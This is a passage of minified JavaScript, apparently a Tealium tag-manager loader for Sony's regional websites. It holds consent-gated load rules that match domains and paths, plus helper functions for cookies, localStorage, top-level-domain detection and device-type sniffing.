\/scs\/handler\/CallCenter-Start$/gi.test(a["dom.pathname"])||/^.*\.sony-mea\.com$/.test(a["dom.domain"])&&/^(\/(ar|en)\/electronics\/support\/?)/gi.test(a["dom.pathname"])||/^.*\.sony\.com\.tw$/gi.test(a["dom.domain"])&&/^(\/zh\/electronics\/support\/?)/gi.test(a["dom.pathname"])||/^(.*\.sony\.(com\.au|co\.nz))$/gi.test(a["dom.domain"])&&/^(\/(au|nz)\/contact-us\/?)$/gi.test(a["dom.pathname"])||/^.*\.sony\.com\.hk$/gi.test(a["dom.domain"])&&/^(\/((zh|en)\/electronics\/support\/?)|(\/service\/contactus\/(zh|en)\/index\.do))/gi.test(a["dom.pathname"])||/^((stg)?services\.(kz\.)?sony\.)/.test(a["dom.domain"])&&/(\/triage\/sta)/gi.test(a["dom.pathname"])&&"gwtConsentGiven"==a.cs_event_name&&/(all|support)/gi.test(a.cs_consent_categories)||/^((stg)?services\.(kz\.)?sony\.)/.test(a["dom.domain"])&&/^((?!(\/supportmvc\/..\/Contact)).)*$/gi.test(a["dom.pathname"])&&/^((?!(\/triage)).)*$/gi.test(a["dom.pathname"])&&"gwtConsentGiven"==a.cs_event_name&&/(all|support)/gi.test(a.cs_consent_categories)||/^.*\.sony-asia\.com$/.test(a["dom.domain"])&&/\/articles\/00278415/.test(a["dom.pathname"])}catch(e){utag.DB(e)}break;case"136":try{o[136]|=/.*\.(sony|sonylatvija|sony-asia|sony-mea|sony-africa|sony-latin)\..*/.test(a["dom.domain"])&&/^((\/|\/..\/|\/zh-cn\/|\/en-br\/)electronics\/support\/?|(\/|\/..\/|\/zh-cn\/|\/en-br\/)electronics\/support\/.*|\/support\/(..)\/.*)$/.test(a["dom.pathname"])&&"gwtConsentGiven"==a.cs_event_name&&/(all|performance|adobe-marketing-cloud-analytics|C0002)/gi.test(a.cs_consent_categories)||/^(services\.(kz\.sony|sony|sonylatvija)\..*)$/.test(a["dom.domain"])&&"gwtConsentGiven"==a.cs_event_name&&/(all|performance|adobe-marketing-cloud-analytics)/gi.test(a.cs_consent_categories)||/^(www\.sony\.com\.sg)$/.test(a["dom.domain"])&&/^(\/microsite\/repair\/index_microsurvey\.html\/?)$/.test(a["dom.pathname"])||/(\.sony\.com\.hk)$/.test(a["dom.domain"])&&/\/..\/electronics\/support/.test(a["dom.pathname"])||/^(www\.sony-asia\.com)$/.test(a["dom.domain"])&&/^(\/microsite\/support\/interactive\/.*)$/.test(a["dom.pathname"])||/^(locator\.sony)$/.test(a["dom.domain"])&&/^(\/.._(BG|RU|AT|BA|BE|CH|CH|CZ|DE|EE|ES|FR|GB|GR|HR|HU|IE|KZ|LT|LV|YU|MK|NL|PL|PT|RO|RU|SI|SK|TR|UA|IT)\/servicecenters\/?)$/.test(a["dom.pathname"])}catch(e){utag.DB(e)}break;case"149":try{o[149]|=/^(preview-production-pdp\.sony\.eu)$/.test(a["dom.domain"])&&/^(\/en\/electronics\/wireless-speakers\/srs-ns7\/?)$/.test(a["dom.pathname"])||/^(preview-production-pdp\.sony\.eu)$/.test(a["dom.domain"])&&/^(\/en\/electronics\/headband-headphones\/wh-1000xm5\/?)$/.test(a["dom.pathname"])}catch(e){utag.DB(e)}break;case"150":try{o[150]|=/(\.sony\.co\.nz)$/.test(a["dom.domain"])}catch(e){utag.DB(e)}break;case"151":try{o[151]|=/(\.sony\.com\.tw)$/.test(a["dom.domain"])&&/\/en\/?/.test(a["dom.pathname"])}catch(e){utag.DB(e)}break;case"152":try{o[152]|=/(\.sony\.com\.hk)$/.test(a["dom.domain"])&&/\/en\/?/.test(a["dom.pathname"])}catch(e){utag.DB(e)}break;case"153":try{o[153]|=/(\.sony\.ca)$/.test(a["dom.domain"])}catch(e){utag.DB(e)}break;case"154":try{o[154]|=/(\.sony\.(com\.mx|com\.ar|cl))$/.test(a["dom.domain"])}catch(e){utag.DB(e)}break;case"156":try{o[156]|=/^(www\.sony\.ru)$/.test(a["dom.domain"])&&/^(\/electronics\/promo\/seasonal\/?)$/.test(a["dom.pathname"])}catch(e){utag.DB(e)}break;case"157":try{o[157]|=/^(www\.sony\.(co\.uk|de|se|no|ru|com\.(tw|hk|my|sg)))$/.test(a["dom.domain"])&&/^(\/((zh|en)\/)?electronics\/(smartphones|smarttelefoner|smartfony)\/xperia-pro-i)$/.test(a["dom.pathname"])&&"gwtConsentGiven"==a.cs_event_name&&/(all|advertising|google-adwords)/.test(a.cs_consent_categories)&&/(all|advertising|google-adsense)/.test(a.cs_consent_categories)||/^(www\.sony\.(co\.uk|de|se|no|ru|com\.(tw|hk|my|sg)))$/.test(a["dom.domain"])&&/^(\/((zh|en)\/)?smartphones\/products\/xperia-pro-i)$/.test(a["dom.pathname"])&&"gwtConsentGiven"==a.cs_event_name&&/(all|advertising|google-adwords)/.test(a.cs_consent_categories)&&/(all|advertising|google-adsense)/.test(a.cs_consent_categories)}catch(e){utag.DB(e)}break;case"160":try{o[160]|=/((kz)?\.sony\.(ru|kz|ua))/.test(a["dom.domain"])}catch(e){utag.DB(e)}break;case"161":try{o[161]|=/^(author-sonyglobalsolutions-prd65\.adobecqms\.net)$/.test(a["dom.domain"])&&/^(\/content\/sony\/sola\/ni\/es-ni)/.test(a["dom.pathname"])}catch(e){utag.DB(e)}break;case"18":try{o[18]|=/^((uat-pdp|www)\.sony\.ru)$/.test(a["dom.domain"])&&/^(\/electronics\/)/.test(a["dom.pathname"])&&void 0!==a.tagsPageTemplate&&""!=a.tagsPageTemplate&&/(category|gallery)/.test(a.tagsPageTemplate)&&void 0!==a.tagsProductCategory1&&""!=a.tagsProductCategory1&&a.tagsProductCategory1.toString().toLowerCase()=="mobile-tablets".toLowerCase()}catch(e){utag.DB(e)}break;case"19":try{o[19]|=/^((uat-pdp|www)\.sony\.ru)$/.test(a["dom.domain"])&&/^(\/electronics\/)/.test(a["dom.pathname"])&&void 0!==a.tagsPageTemplate&&""!=a.tagsPageTemplate&&/(product_details|transition)/.test(a.tagsPageTemplate)}catch(e){utag.DB(e)}break;case"20":try{o[20]|=/(\.sony\.com\.vn)$/.test(a["dom.domain"])&&a["dom.pathname"].toString().toLowerCase().indexOf("/electronics/support".toLowerCase())>-1&&a["dom.pathname"].toString().toLowerCase().indexOf("/support/tvhelp/".toLowerCase())<0}catch(e){utag.DB(e)}break;case"21":try{o[21]|=/(\.sony\.co\.uk)$/.test(a["dom.domain"])&&/^(\/electronics\/support\/?|\/support\/?)($|\/.*)/.test(a["dom.pathname"])&&a["dom.pathname"].toString().toLowerCase().indexOf("/support/tvhelp/".toLowerCase())<0&&"gwtConsentGiven"==a.cs_event_name&&/(all|performance)/.test(a.cs_consent_categories)}catch(e){utag.DB(e)}break;case"22":try{o[22]|=/^(www\.sony\.com)$/.test(a["dom.domain"])&&/^(\/electronics\/support\/.*|\/electronics\/support)$/.test(a["dom.pathname"])&&a["dom.pathname"].toString().toLowerCase().indexOf("/support/tvhelp/".toLowerCase())<0&&"gwtConsentGiven"==a.cs_event_name&&/(all|C0002)/.test(a.cs_consent_categories)}catch(e){utag.DB(e)}break;case"23":try{o[23]|=/(\.sony\.com\.tw)$/.test(a["dom.domain"])&&a["dom.pathname"].toString().toLowerCase().indexOf("/zh/electronics/support".toLowerCase())>-1&&a["dom.pathname"].toString().toLowerCase().indexOf("/support/tvhelp/".toLowerCase())<0}catch(e){utag.DB(e)}break;case"24":try{o[24]|=/(\.sony\.co\.th)$/.test(a["dom.domain"])&&a["dom.pathname"].toString().toLowerCase().indexOf("/th/electronics/support".toLowerCase())>-1&&a["dom.pathname"].toString().toLowerCase().indexOf("/support/tvhelp/".toLowerCase())<0}catch(e){utag.DB(e)}break;case"25":try{o[25]|=/(\.sony\.com\.sg)$/.test(a["dom.domain"])&&a["dom.pathname"].toString().toLowerCase().indexOf("/electronics/support".toLowerCase())>-1&&a["dom.pathname"].toString().toLowerCase().indexOf("/support/tvhelp/".toLowerCase())<0}catch(e){utag.DB(e)}break;case"26":try{o[26]|=/^((www|services)\.sony\.ru)$/.test(a["dom.domain"])&&/^(\/electronics\/support\/?|\/support\/?)($|\/.*)/.test(a["dom.pathname"])&&a["dom.pathname"].toString().toLowerCase().indexOf("/support/tvhelp/".toLowerCase())<0}catch(e){utag.DB(e)}break;case"27":try{o[27]|=/^((www\.)?sony\.pl)$/.test(a["dom.domain"])&&/^(\/electronics\/support\/?|\/support\/?)($|\/.*)/.test(a["dom.pathname"])&&a["dom.pathname"].toString().toLowerCase().indexOf("/support/tvhelp/".toLowerCase())<0&&"gwtConsentGiven"==a.cs_event_name&&/(all|performance)/.test(a.cs_consent_categories)}catch(e){utag.DB(e)}break;case"28":try{o[28]|=/(\.sony\.co\.nz)$/.test(a["dom.domain"])&&a["dom.pathname"].toString().toLowerCase().indexOf("/electronics/support".toLowerCase())>-1&&a["dom.pathname"].toString().toLowerCase().indexOf("/support/tvhelp/".toLowerCase())<0}catch(e){utag.DB(e)}break;case"29":try{o[29]|=/^((www\.)?sony\.nl)$/.test(a["dom.domain"])&&/^(\/electronics\/support\/?|\/support\/?)($|\/.*)/.test(a["dom.pathname"])&&a["dom.pathname"].toString().toLowerCase().indexOf("/support/tvhelp/".toLowerCase())<0&&"gwtConsentGiven"==a.cs_event_name&&/(all|performance)/.test(a.cs_consent_categories)}catch(e){utag.DB(e)}break;case"30":try{o[30]|=/(\.sony\.com\.my)$/.test(a["dom.domain"])&&a["dom.pathname"].toString().toLowerCase().indexOf("/electronics/support".toLowerCase())>-1&&a["dom.pathname"].toString().toLowerCase().indexOf("/support/tvhelp/".toLowerCase())<0}catch(e){utag.DB(e)}break;case"31":try{o[31]|=/(\.sony-mea\.com)$/.test(a["dom.domain"])&&a["dom.pathname"].toString().toLowerCase().indexOf("/en/electronics/support".toLowerCase())>-1&&a["dom.pathname"].toString().toLowerCase().indexOf("/support/tvhelp/".toLowerCase())<0}catch(e){utag.DB(e)}break;case"32":try{o[32]|=/^(www\.sony-latin\.com)$/.test(a["dom.domain"])&&/^(\/es\/electronics\/support\/.*|\/es\/electronics\/support)$/.test(a["dom.pathname"])&&a["dom.pathname"].toString().toLowerCase().indexOf("/support/tvhelp/".toLowerCase())<0}catch(e){utag.DB(e)}break;case"33":try{o[33]|=/(\.sony\.co\.kr)$/.test(a["dom.domain"])&&a["dom.pathname"].toString().toLowerCase().indexOf("/electronics/support".toLowerCase())>-1&&a["dom.pathname"].toString().toLowerCase().indexOf("/support/tvhelp/".toLowerCase())<0}catch(e){utag.DB(e)}break;case"34":try{o[34]|=/^(knowledge\.support\.sony\.jp)$/.test(a["dom.domain"])&&/^(\/electronics\/support\/?.*)$/.test(a["dom.pathname"])}catch(e){utag.DB(e)}break;case"35":try{o[35]|=/^((www\.)?sony\.it)$/.test(a["dom.domain"])&&/^(\/electronics\/support\/?|\/support\/?)($|\/.*)/.test(a["dom.pathname"])&&a["dom.pathname"].toString().toLowerCase().indexOf("/support/tvhelp/".toLowerCase())<0&&"gwtConsentGiven"==a.cs_event_name&&/(all|performance|qualtrics)/.test(a.cs_consent_categories)}catch(e){utag.DB(e)}break;case"36":try{o[36]|=/(\.sony\.co\.in)$/.test(a["dom.domain"])&&a["dom.pathname"].toString().toLowerCase().indexOf("/electronics/support".toLowerCase())>-1&&a["dom.pathname"].toString().toLowerCase().indexOf("/support/tvhelp/".toLowerCase())<0}catch(e){utag.DB(e)}break;case"37":try{o[37]|=/(\.sony\.co\.id)$/.test(a["dom.domain"])&&a["dom.pathname"].toString().toLowerCase().indexOf("/en/electronics/support".toLowerCase())>-1&&a["dom.pathname"].toString().toLowerCase().indexOf("/support/tvhelp/".toLowerCase())<0}catch(e){utag.DB(e)}break;case"38":try{o[38]|=/(\.sony\.com\.hk)$/.test(a["dom.domain"])&&a["dom.pathname"].toString().toLowerCase().indexOf("/zh/electronics/support".toLowerCase())>-1&&a["dom.pathname"].toString().toLowerCase().indexOf("/support/tvhelp/".toLowerCase())<0}catch(e){utag.DB(e)}break;case"39":try{o[39]|=/(\.sony\.com\.hk)$/.test(a["dom.domain"])&&a["dom.pathname"].toString().toLowerCase().indexOf("/en/electronics/support".toLowerCase())>-1&&a["dom.pathname"].toString().toLowerCase().indexOf("/support/tvhelp/".toLowerCase())<0}catch(e){utag.DB(e)}break;case"40":try{o[40]|=/(\.sony\.com)$/.test(a["dom.domain"])&&/^(\/zh-cn\/electronics\/support\/?)/.test(a["dom.pathname"])&&a["dom.pathname"].toString().toLowerCase().indexOf("/support/tvhelp/".toLowerCase())<0}catch(e){utag.DB(e)}break;case"41":try{o[41]|=/^(www\.sony\.ca)$/.test(a["dom.domain"])&&/^(\/en\/electronics\/support\/.*|\/en\/electronics\/support)$/.test(a["dom.pathname"])&&a["dom.pathname"].toString().toLowerCase().indexOf("/support/tvhelp/".toLowerCase())<0}catch(e){utag.DB(e)}break;case"42":try{o[42]|=/^(www\.sony\.com\.br)$/.test(a["dom.domain"])&&/^(\/electronics\/support\/.*|\/electronics\/support)$/.test(a["dom.pathname"])&&a["dom.pathname"].toString().toLowerCase().indexOf("/support/tvhelp/".toLowerCase())<0}catch(e){utag.DB(e)}break;case"43":try{o[43]|=/(\.sony\.com\.au)$/.test(a["dom.domain"])&&a["dom.pathname"].toString().toLowerCase().indexOf("/electronics/support".toLowerCase())>-1&&a["dom.pathname"].toString().toLowerCase().indexOf("/support/tvhelp/".toLowerCase())<0}catch(e){utag.DB(e)}break;case"44":try{o[44]|=/^(www\.sony\.ua)$/.test(a["dom.domain"])}catch(e){utag.DB(e)}break;case"45":try{o[45]|=/^(community\.sony\.kz)$/.test(a["dom.domain"])}catch(e){utag.DB(e)}break;case"46":try{o[46]|=/^(www\.sony\.kz)$/.test(a["dom.domain"])}catch(e){utag.DB(e)}break;case"49":try{o[49]|=/(\.(sony-africa|sony-asia|sony-mea)\.com)|sony\.(com\.my|com\.ph|com\.sg|com\.vn|co\.id|co\.in|co.th)$/.test(a["dom.domain"])}catch(e){utag.DB(e)}break;case"50":try{o[50]|=/^(alphapro\.sony\.ru)$/.test(a["dom.domain"])}catch(e){utag.DB(e)}break;case"51":try{o[51]|=/^(community(-stage)?\.sony\.ru)$/.test(a["dom.domain"])}catch(e){utag.DB(e)}break;case"52":try{o[52]|=/^(www\.sony\.ru)$/.test(a["dom.domain"])}catch(e){utag.DB(e)}break;case"53":try{o[53]|=/^((stg-)?store\.sony\.ru)$/.test(a["dom.domain"])}catch(e){utag.DB(e)}break;case"54":try{o[54]|=/^(www\.sony\.com\.pa)$/.test(a["dom.domain"])}catch(e){utag.DB(e)}break;case"55":try{o[55]|=/^(www\.sony\.com\.hk)$/.test(a["dom.domain"])&&/^(\/(zh|en)\/electronics\/.*\/buy\/?)$/.test(a["dom.pathname"])}catch(e){utag.DB(e)}break;case"57":try{o[57]|=/(\.sony\.com\.mx|\.sony\.com\.ar|\.sony\.com\.co|\.sony\.cl|\.sony\.com\.pe|\.sony\.com\.ec|\.sony\.com\.gt)$/.test(a["dom.domain"])&&/^\/corporate\/(mx|ar|co|cl|pe|ec|gt)\/(servicioysoporte\/servicio\.html\/?|dondecomprar\/dondecomprar.html\/?)$/.test(a["dom.pathname"])&&"gwtConsentGiven"==a.cs_event_name&&/(all|performance)/.test(a.cs_consent_categories)}catch(e){utag.DB(e)}break;case"63":try{o[63]|=/^(?!((.*\.sony\.(at|be|bg|cz|hr|dk|ee|fi|fr|de|gr|hu|ie|it|lt|lu|nl|no|pl|pt|ro|sk|si|es|se|co\.uk|com\.pe)|.*\.sonylatvija\.com)))/.test(a["dom.domain"])&&/^(\/electronics\/.*\/reviews-ratings\/?|\/..\/electronics\/.*\/reviews-ratings\/?)$/.test(a["dom.pathname"])&&/.*sony.*/.test(a["dom.domain"])||/((\.sony\.(at|be|bg|cz|hr|dk|ee|fi|fr|de|gr|hu|ie|it|lt|lu|nl|no|pl|pt|ro|sk|si|es|se|co\.uk|com\.pe))|sonylatvija.com)$/.test(a["dom.domain"])&&/^(\/electronics\/.*\/reviews-ratings\/?|\/..\/electronics\/.*\/reviews-ratings\/?)$/.test(a["dom.pathname"])&&"gwtConsentGiven"==a.cs_event_name&&/(all|performance|bazaarvoice)/.test(a.cs_consent_categories)}catch(e){utag.DB(e)}break;case"64":try{o[64]|=/^(www\.sony\.com\.mx)$/.test(a["dom.domain"])&&/^(\/(all-electronics|electronics|my-favorites|sitemap)\/?)/.test(a["dom.pathname"])&&a["dom.pathname"].toString().indexOf("/support")<0||/^(www\.sony\.com\.mx)$/.test(a["dom.domain"])&&/^(\/?)$/.test(a["dom.pathname"])}catch(e){utag.DB(e)}break;case"66":try{o[66]|=/(\.sony\.com\.au)$/.test(a["dom.domain"])}catch(e){utag.DB(e)}break;case"67":try{o[67]|=/(\.sony\.co\.in)$/.test(a["dom.domain"])}catch(e){utag.DB(e)}break;case"68":try{o[68]|=/^(www\.sony\.com)$/.test(a["dom.domain"])&&/^(?!\/(en-dz|fr-dz|en-ao|pt-ao|en-bj|fr-bj|en-bf|fr-bf|en-cm|fr-cm|en-cd|fr-cd|ar-eg|en-eg|et|en-ga|fr-ga|gh|en-ci|fr-ci|ke|lr|ar-ly|en-ly|en-mu|fr-mu|en-ma|fr-ma|ng|en-sn|fr-sn|za|tz|en-tn|fr-tn|ug|en-bh|ar-bh|ar-iq|en-iq|ar-jo|en-jo|ar-kw|en-kw|ar-lb|en-lb|ar-om|en-om|pk|ar-qa|en-qa|ar-sa|en-sa|ar-ae|ar-sy|en-sy|en-ae|ar-ye|en-ye|zh-cn)\/?).*/.test(a["dom.pathname"])&&a["dom.pathname"].toString().indexOf("/electronics/support")<0}catch(e){utag.DB(e)}break;case"69":try{o[69]|=/(\.sony\.(de|es|fr|co\.uk))$/.test(a["dom.domain"])&&/^(\/(all-electronics|electronics|my-favorites|sitemap)\/?)/.test(a["dom.pathname"])&&"gwtConsentGiven"==a.cs_event_name&&/(all|performance|qualtrics)/.test(a.cs_consent_categories)&&a["dom.pathname"].toString().indexOf("/support")<0||/(\.sony\.(de|es|fr|co\.uk))$/.test(a["dom.domain"])&&/^(\/?)$/.test(a["dom.pathname"])&&"gwtConsentGiven"==a.cs_event_name&&/(all|performance|qualtrics)/.test(a.cs_consent_categories)}catch(e){utag.DB(e)}break;case"70":try{o[70]|=/(\.sony\.(de|fr|co\.uk|es))$/.test(a["dom.domain"])&&"gwtConsentGiven"==a.cs_event_name&&/(all|performance|qualtrics)/.test(a.cs_consent_categories)}catch(e){utag.DB(e)}break;case"72":try{o[72]|="gwtConsentGiven"==a.cs_event_name&&/(all|performance|adobe-marketing-cloud-analytics|C0002)/gi.test(a.cs_consent_categories)}catch(e){utag.DB(e)}break;case"73":try{o[73]|=/((sony\.(at|ba|be|bg|ch|co\.uk|com\.mk|com\.pl|com\.tr|cz|de|dk|ee|es|eu|fi|fr|gr|hr|hu|ie|it|lt|lu|lv|net|nl|no|pl|pt|ro|rs|se|si|sk|co\.il))|sony-europe\.com|sonystyle-europe\.com|sonylatvija\.com)$/gi.test(a["dom.domain"])&&a["dom.pathname"].toString().indexOf("/mysony/ForgotPassword")<0&&"gwtConsentGiven"==a.cs_event_name&&/(all|performance|google-analytics)/gi.test(a.cs_consent_categories)&&/(all|advertising|doubleclick)/gi.test(a.cs_consent_categories)&&/^(global:gw(t|x))$/.test(a.website_platform)}catch(e){utag.DB(e)}break;case"74":try{o[74]|=/(((sony)\.(com\.ar|cl|com\.co|com\.mx|com\.pa|com\.br|co\.cr|com\.bo|com\.do|com\.ec|com\.sv|com\.gt|com\.hn|com\.py|com\.pe|com\.pr|com\.ve|com\.ni)|sony-latin\.com|sonypr\.com)|m8agency\.com|syndication\-sola\.com|alphauniverse-latin\.com)$/gi.test(a["dom.domain"])&&"gwtConsentGiven"==a.cs_event_name&&/(all|advertising)/.test(a.cs_consent_categories)&&/^(global:gw(t|x))$/.test(a.website_platform)}catch(e){utag.DB(e)}break;case"75":try{o[75]|=/(\.sony\.(ca|com)|sony.registriastaging.com)$/gi.test(a["dom.domain"])&&/^(?!\/((...|)(asia|middle-east|ae|ao|bf|bh|bj|cg|ci|cm|dz|eg|et|ga|gh|iq|jo|ke|kw|lb|lr|ly|ma|mu|ng|om|pk|qa|sa|sn|sy|tn|tz|ug|ye|za|cn))\/?).*$/gi.test(a["dom.pathname"])&&"regional:ecommerce"!=a.website_platform&&"gwtConsentGiven"==a.cs_event_name&&/(all|C0004)/gi.test(a.cs_consent_categories)}catch(e){utag.DB(e)}break;case"76":try{o[76]|=/(sony\.com)$/gi.test(a["dom.domain"])&&/^\/(...|)(asia|middle-east|ae|ao|bf|bh|bj|cg|ci|cn|cm|dz|eg|et|ga|gh|iq|jo|ke|kw|lb|lr|ly|ma|mu|ng|om|pk|qa|sa|sn|sy|tn|tz|ug|ye|za)(|\/?|\/.*)$/gi.test(a["dom.pathname"])&&/^(global:gw(t|x))$/.test(a.website_platform)}catch(e){utag.DB(e)}break;case"77":try{o[77]|=/(sony\.(co\.id|co\.in|co\.ir|co\.kr|co\.nz|co\.th|co\.za|com\.au|com\.cn|com\.hk|com\.my|com\.ph|com\.sg|com\.tw|com\.vn)|(sony-africa|sony-asia|sony-mea)\.com)$/gi.test(a["dom.domain"])&&/^(global:gw(t|x))$/.test(a.website_platform)}catch(e){utag.DB(e)}break;case"78":try{o[78]|=/^(community\.sony\.ua)$/.test(a["dom.domain"])}catch(e){utag.DB(e)}break;case"9":try{o[9]|=/((\.sony\.(at|be|bg|cz|hr|dk|ee|fi|fr|de|gr|hu|ie|it|lt|lu|nl|no|pl|pt|ro|sk|si|es|se|co\.uk|com\.tr|co\.il))|sonylatvija.com)$/.test(a["dom.domain"])&&"gwtConsentGiven"==a.cs_event_name&&/(all|performance|google-analytics)/gi.test(a.cs_consent_categories)&&/(all|advertising|doubleclick)/gi.test(a.cs_consent_categories)&&/^(global:gw(t|x))$/.test(a.website_platform)||/^(?!((.*\.sony\.(at|be|bg|cz|hr|dk|ee|fi|fr|de|gr|hu|ie|it|lt|lu|nl|no|pl|pt|ro|sk|si|es|se|co\.uk|ru|ua|kz|com\.tr|co\.il)|.*\.sonylatvija\.com))|(electronics\.sony\.com))/.test(a["dom.domain"])&&/^(global:gw(t|x))$/.test(a.website_platform)}catch(e){utag.DB(e)}}},utag.pre=function(){utag.loader.initdata();try{utag.loader.RD(utag.data)}catch(e){utag.DB(e)}utag.loader.loadrules()},utag.loader.GET=function(){utag.cl={_all_:1},utag.pre(),utag.handler.extend=[function(e,t){try{if(utag.runonce=utag.runonce||{},utag.runonce.ext=utag.runonce.ext||{},void 0===utag.runonce.ext[1]){utag.runonce.ext[1]=1,window._bsq=window._bsq||{},_bsq.utils=_bsq.utils||{};try{"undefined"!=typeof jQuery&&void 0!==jQuery.extend?window._originalLocation=jQuery.extend(!0,{},window.location):(window._originalLocation=JSON.parse(JSON.stringify(window.location)),window._originalLocation.search=window.location.search||"",window._originalLocation.href=window.location.href||"",window._originalLocation.hostname=window.location.hostname||"",window._originalLocation.hash=window.location.hash||"",window._originalLocation.host=window.location.host||"",window._originalLocation.origin=window.location.origin||"",window._originalLocation.pathname=window.location.pathname||"",window._originalLocation.protocol=window.location.protocol||"",window._originalLocation.port=window.location.port||"")}catch(e){}_bsq.utils.getQueryParameter=function(e,t,a){var o=new RegExp("[\\?&]"+t+"=([^&#]*)",a?"i":"").exec(e);return null==o?"":decodeURIComponent(o[1].replace(/\+/g," "))},_bsq.utils.parents=function(e){for(var t=[e];e;e=e.parentNode)t.unshift(e);return t},_bsq.utils.isAncestor=function(e,t){var a,o=_bsq.utils.parents(e),i="";if(t=t.toLowerCase(),void 0!==o)for(var r=0;r<o.length;r++)if(a=o[r].className||"",i=o[r].id||"",a.toLowerCase()===t||i.toLowerCase()===t)return!0;return!1},"function"!=typeof String.prototype.trim&&(String.prototype.trim=function(){return this.replace(/^\s+|\s+$/g,"")}),_bsq.utils.domainPeriodsPattern=/(.*\.co\.uk)$|(.*\.com\.mk)$|(.*\.com\.tr)$|(.*\.co\.yu)$|(.*\.com\.ar)$|(.*\.com\.br)$|(.*\.com\.co)$|(.*\.com\.mx)$|(.*\.com\.pa)$|(.*\.co\.cr)$|(.*\.com\.bo)$|(.*\.com\.do)$|(.*\.com\.ec)$|(.*\.com\.sv)$|(.*\.com\.gt)$|(.*\.com\.hn)$|(.*\.com\.py)$|(.*\.co\.yu)$|(.*\.com\.pe)$|(.*\.com\.pr)$|(.*\.com\.ve)$|(.*\.com\.ni)$|(.*\.co\.id)$|(.*\.co\.in)$|(.*\.com\.ir)$|(.*\.co\.kr)$|(.*\.co\.nz)$|(.*\.co\.th)$|(.*\.com\.za)$|(.*\.com\.au)$|(.*\.com\.cn)$|(.*\.com\.hk)$|(.*\.com\.my)$|(.*\.com\.ph)$|(.*\.com\.sg)$|(.*\.com\.tw)$|(.*\.com\.vn)$|(.*\.co\.il)$/gi,_bsq.utils.getTLD=function(){var e,t,a=location.hostname,o=2;if(/(.*\.co\.uk)$|(.*\.com\.mk)$|(.*\.com\.tr)$|(.*\.co\.yu)$|(.*\.com\.ar)$|(.*\.com\.br)$|(.*\.com\.co)$|(.*\.com\.mx)$|(.*\.com\.pa)$|(.*\.co\.cr)$|(.*\.com\.bo)$|(.*\.com\.do)$|(.*\.com\.ec)$|(.*\.com\.sv)$|(.*\.com\.gt)$|(.*\.com\.hn)$|(.*\.com\.py)$|(.*\.co\.yu)$|(.*\.com\.pe)$|(.*\.com\.pr)$|(.*\.com\.ve)$|(.*\.com\.ni)$|(.*\.co\.id)$|(.*\.co\.in)$|(.*\.com\.ir)$|(.*\.co\.kr)$|(.*\.co\.nz)$|(.*\.co\.th)$|(.*\.com\.za)$|(.*\.com\.au)$|(.*\.com\.cn)$|(.*\.com\.hk)$|(.*\.com\.my)$|(.*\.com\.ph)$|(.*\.com\.sg)$|(.*\.com\.tw)$|(.*\.com\.vn)$|(.*\.co\.il)$/gi.test(window.location.hostname)&&(o=3),a&&!/^[0-9.]+$/.test(a)&&(o=2<(o=o?parseInt(o):2)?o:2,0<=(e=a.lastIndexOf(".")))){for(;0<=e&&1<o;)e=a.lastIndexOf(".",e-1),o--;t=0<e?a.substring(e):a}return t},_bsq.utils.docCookies={getItem:function(e){return(decodeURIComponent(document.cookie.replace(new RegExp("(?:(?:^|.*;)\\s*"+encodeURIComponent(e).replace(/[\-\.\+\*]/g,"\\$&")+"\\s*\\=\\s*([^;]*).*$)|^.*$"),"$1"))||"").replace(/,?\[\[B\]\],?/gi,"")},setItem:function(e,t,a,o,i,r){if(!e||/^(?:expires|max\-age|path|domain|secure)$/i.test(e))return!1;var n="";if(a)switch(a.constructor){case Number:n=a===1/0?"; expires=Fri, 31 Dec 9999 23:59:59 GMT":"; max-age="+a;break;case String:n="; expires="+a;break;case Date:n="; expires="+a.toUTCString()}var s="https:"===location.protocol,d=encodeURIComponent(e)+"="+encodeURIComponent(t)+n+(i?"; domain="+i:"; domain="+_bsq.utils.getTLD())+(o?"; path="+o:"; path=/")+(s?"; secure":"");return document.cookie=d.replace(/,?\[\[B\]\],?/gi,""),!0},removeItem:function(e,t,a){return!(!e||!this.hasItem(e))&&(document.cookie=encodeURIComponent(e)+"=; expires=Thu, 01 Jan 1970 00:00:00 GMT"+(a?"; domain="+a:"")+(t?"; path="+t:""),!0)},hasItem:function(e){return new RegExp("(?:^|;\\s*)"+encodeURIComponent(e).replace(/[\-\.\+\*]/g,"\\$&")+"\\s*\\=").test(document.cookie)},keys:function(){for(var e=document.cookie.replace(/((?:^|\s*;)[^\=]+)(?=;|$)|^\s*|\s*(?:\=[^;]*)?(?:\1|$)/g,"").split(/\s*(?:\=[^;]*)?;\s*/),t=0;t<e.length;t++)e[t]=decodeURIComponent(e[t]);return e}},_bsq.utils.docStorage={getItem:function(e){if(!_bsq.utils.isLocalStorageSupported())return"";var t=localStorage.getItem(e);if(null!==t){var a=t.substring(t.indexOf("|")+1,t.length);return Date.now()<new Date(a)?t.substring(0,t.indexOf("|")):""}},setItem:function(e,t){if(_bsq.utils.isLocalStorageSupported()){var a=new Date(Date.now()),o=new Date(a.getTime()+18e5);t=(t.indexOf("|")>0?t.substring(0,t.indexOf("|")):t)+"|"+o.toUTCString(),localStorage.setItem(e,t)}}},_bsq.utils.getDeviceType=function(){var e=navigator.userAgent.toLowerCase(),t="",a=[{type:"Windows Mobile",regexs:[/(windows\s(ce|phone)|iemobile)/i,/(wpdesktop);\s(lumia[\s\w]+)/i]},{type:"TV",regexs:[/CrKey/i,/apple\s{0,1}tv/i,/Macintosh;\s{0,1}PPC\)\s{0,1}Escape/i,/GoogleTV/i,/NetCast\.TV/i,/Opera\s{0,1}TV/i,/Bravia/i,/sonyCEBrowser.*CTV/i,/DTV/i,/HbbTV/i,/NETTV/i,/GTV/i,/TSBNetTV/i,/Smart(\-){0,1}TV/i,/Maple/i,/SC\/IHD92\s{0,1}STB/i,/POV_TV/i,/Roku\/DVP/i,/Viera/i,/Kylo/i]},{type:"iPhone",regexs:[/ipod|(\(iphone\s{0,1};)/i]},{type:"iPad",regexs:[/(ipad)/i]},{type:"Android Mobile",regexs:[/android.*(mobile|mobi)/i]},{type:"Android Tablet",regexs:[/(?=.*android)(?!.*(mobile|mobi|\s(ouya)\s|\s(shield)\sbuild))(.+)/i]},{type:"BlackBerry",regexs:[/blackberry|\(bb10;\s(\w+)/i]},{type:"Game",regexs:[/\s(ouya)\s/i,/nintendo/i,/android.+;\s(shield)\sbuild/i,/playstation/i,/[\s\(;](xbox(?:\sone)?)[\s\);]/i]},{type:"Feature Phone",regexs:[/docomo|foma|kddi|vodafone|j-phone|netfront|jig 